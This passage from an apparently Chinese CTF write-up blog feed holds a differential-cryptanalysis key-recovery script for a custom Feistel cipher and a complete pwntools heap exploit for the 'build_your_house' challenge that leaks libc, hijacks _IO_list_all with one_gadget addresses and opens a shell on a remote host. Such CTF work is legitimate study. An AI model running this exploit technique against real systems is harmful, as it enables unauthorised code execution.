class="line">     <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>]]</span><br><span class="line">p_box = [<span class="number">19</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">31</span>,</span><br><span class="line">         <span class="number">11</span>, <span class="number">28</span>]</span><br><span class="line">extend_key = [<span class="number">2</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">32</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">35</span>, <span class="number">5</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">12</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">26</span>,</span><br><span class="line">              <span class="number">1</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">31</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">23</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagc, pairs = load(<span class="built_in">open</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;r&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">msg</span>):</span></span><br><span class="line">    pad_len = (<span class="number">8</span> - <span class="built_in">len</span>(msg) % <span class="number">8</span>) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> msg + <span class="built_in">bytes</span>([pad_len] * pad_len)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand_key</span>(<span class="params">key_seed=<span class="literal">None</span></span>):</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">if</span> key_seed == <span class="literal">None</span>:</span><br><span class="line">        key_seed = random.getrandbits(<span class="number">48</span>)</span><br><span class="line">    Keygenerator = KEYGENERATOR(key_seed)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        keys.append(Keygenerator.<span class="built_in">next</span>())</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    a = <span class="number">0xdeadbeef</span></span><br><span class="line">    b = <span class="number">0xbeefdead</span></span><br><span class="line">    p = <span class="number">244953516689137</span></span><br><span class="line">    INV = inverse(a, p)</span><br><span class="line">    key = ((key - b) * INV) % p</span><br><span class="line">    key_inv = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">    key_bin = <span class="built_in">bin</span>(key)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        key_inv[extend_key[j]] = key_bin[j]</span><br><span class="line">    key_invs = <span class="string">&#x27;&#x27;</span>.join(key_inv)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(key_invs, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_keys</span>(<span class="params">k8</span>):</span></span><br><span class="line">    keys = [<span class="number">0</span>]*<span class="number">7</span> + [k8]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        keys[i] = inv_key(keys[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_p</span>(<span class="params">x</span>):</span></span><br><span class="line">    x_bin = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line">    y_bin = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        y_bin[p_box[i]] = x_bin[i]</span><br><span class="line">    y = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> y_bin]), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KEYGENERATOR</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed</span>):</span></span><br><span class="line">        self.state = seed</span><br><span class="line">        self.a = <span class="number">0xdeadbeef</span></span><br><span class="line">        self.b = <span class="number">0xbeefdead</span></span><br><span class="line">        self.p = <span class="number">244953516689137</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        state_bin = <span class="built_in">bin</span>(self.state)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        tmp = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(state_bin[extend_key[_]] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)), <span class="number">2</span>)</span><br><span class="line">        self.state = (tmp * self.a + self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JULIETENCRYPTBLOCK</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.keys = expand_key(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">s</span>(<span class="params">self, x, index</span>):</span></span><br><span class="line">        row = (x &gt;&gt; <span class="number">5</span> &lt;&lt; <span class="number">1</span> &amp; <span class="number">2</span>) + (x % <span class="number">2</span>)</span><br><span class="line">        col = (x &gt;&gt; <span class="number">1</span> &amp; <span class="number">15</span>)</span><br><span class="line">        <span class="keyword">return</span> s_box[index][(row &lt;&lt; <span class="number">4</span>) + col]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">p</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        binx = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line">        biny = [binx[p_box[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">        y = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> biny]), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        binx = <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        biny = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        index = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> qwer <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(index, index + <span class="number">6</span>):</span><br><span class="line">                biny += binx[j % <span class="number">32</span>]</span><br><span class="line">            index += <span class="number">4</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(biny, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Funct</span>(<span class="params">self, x, k</span>):</span></span><br><span class="line">        x_in = <span class="built_in">bin</span>(self.expand(x) ^ k)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        y_out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">            tmp = <span class="built_in">int</span>(x_in[i:i + <span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            y_out += <span class="built_in">bin</span>(self.s(tmp, i // <span class="number">6</span>))[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        y_out = <span class="built_in">int</span>(y_out, <span class="number">2</span>)</span><br><span class="line">        y = self.p(y_out)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partenc</span>(<span class="params">self, x, keys</span>):</span></span><br><span class="line">        binx = <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        l, r = <span class="built_in">int</span>(binx[:<span class="number">32</span>], <span class="number">2</span>), <span class="built_in">int</span>(binx[<span class="number">32</span>:], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            l, r = r, l ^ self.Funct(r, keys[i])</span><br><span class="line">        y = (l + (r &lt;&lt; <span class="number">32</span>)) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self, pt</span>):</span></span><br><span class="line">        pt = padding(pt)</span><br><span class="line">        c = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">8</span>):</span><br><span class="line">            c_block = long_to_bytes(self.partenc(bytes_to_long(pt[i:i + <span class="number">8</span>]), self.keys)).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            c += c_block</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JK = JULIETENCRYPTBLOCK()</span><br><span class="line">candidate_keys = [Counter() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> _, cs <span class="keyword">in</span> tqdm(pairs):</span><br><span class="line">    c1, c2 = cs</span><br><span class="line">    <span class="keyword">if</span> c1 ^ c2 == <span class="number">0x0400000000000000</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    l1, l2 = c1 &gt;&gt; <span class="number">32</span>, c2 &gt;&gt; <span class="number">32</span></span><br><span class="line">    r1, r2 = c1 &amp; <span class="number">0xffffffff</span>, c2 &amp; <span class="number">0xffffffff</span></span><br><span class="line">    F_ = l1 ^ l2 ^ <span class="number">0x04000000</span></span><br><span class="line">    F_ = inv_p(F_) </span><br><span class="line"></span><br><span class="line">    Ep1 = JK.expand(r1) </span><br><span class="line">    Ep2 = JK.expand(r2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        inp1 = (Ep1 &gt;&gt; (<span class="number">7</span>-i)*<span class="number">6</span>) &amp; <span class="number">0b111111</span>   </span><br><span class="line">        inp2 = (Ep2 &gt;&gt; (<span class="number">7</span>-i)*<span class="number">6</span>) &amp; <span class="number">0b111111</span>   </span><br><span class="line">        out_xor = (F_ &gt;&gt; (<span class="number">7</span>-i)*<span class="number">4</span>) &amp; <span class="number">0b1111</span>  </span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> JK.s(inp1 ^ key, i) ^ JK.s(inp2 ^ key, i) == out_xor:</span><br><span class="line">                candidate_keys[i][key] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    key.append(candidate_keys[i].most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">key8 = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bin</span>(_)[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> key), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(key8)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">rec_keys = inv_keys(key8)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(rec_keys)</span><br><span class="line"></span><br><span class="line">JK = JULIETENCRYPTBLOCK()</span><br><span class="line">FLAGC = long_to_bytes(<span class="built_in">int</span>(flagc, <span class="number">16</span>))</span><br><span class="line">JK.keys = rec_keys</span><br><span class="line"><span class="built_in">print</span>(JK.enc(FLAGC))</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="build-your-house"><a href="#build-your-house" class="headerlink" title="build_your_house"></a>build_your_house</h2><p>在网上找到了类似的题，修改那个题的<code>exp</code>后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">i</span>):</span></span><br><span class="line">ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">b&#x27;a\n&#x27;</span></span>):</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;How big a house do you want to build?&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">ru(<span class="string">&#x27;How do you want to decorate your house?&#x27;</span>)</span><br><span class="line">s(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;Which house do you want to remove?&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;Which house do you want to view?\n&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,mh,fh,system,binsh_addr,_IO_2_1_stdout_,realloc,io_list_all</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-main_arena-<span class="number">200</span></span><br><span class="line">    su(<span class="string">&quot;libc base &quot;</span>,libc_base)</span><br><span class="line">    mh = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    fh = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    io_list_all = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">binary=<span class="string">&#x27;./build_your_house&#x27;</span></span><br><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = <span class="keyword">lambda</span> buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io=process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&#x27;123.57.131.167&#x27;</span>,<span class="number">27356</span>)</span><br><span class="line">e=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">free(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_libc()</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">23</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">heap = u64(rl()[-<span class="number">7</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">224</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>*<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x18</span>+p64(heap+<span class="number">480</span>+<span class="number">16</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x47</span>,p64(one_gadget[<span class="number">1</span>]+libc_base)*<span class="number">8</span>+p64(one_gadget[<span class="number">1</span>]+libc_base)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux反弹shell总结</title>
      <link href="/post/2022-01/Linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/"/>
      <url>/post/2022-01/Linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</url>
      
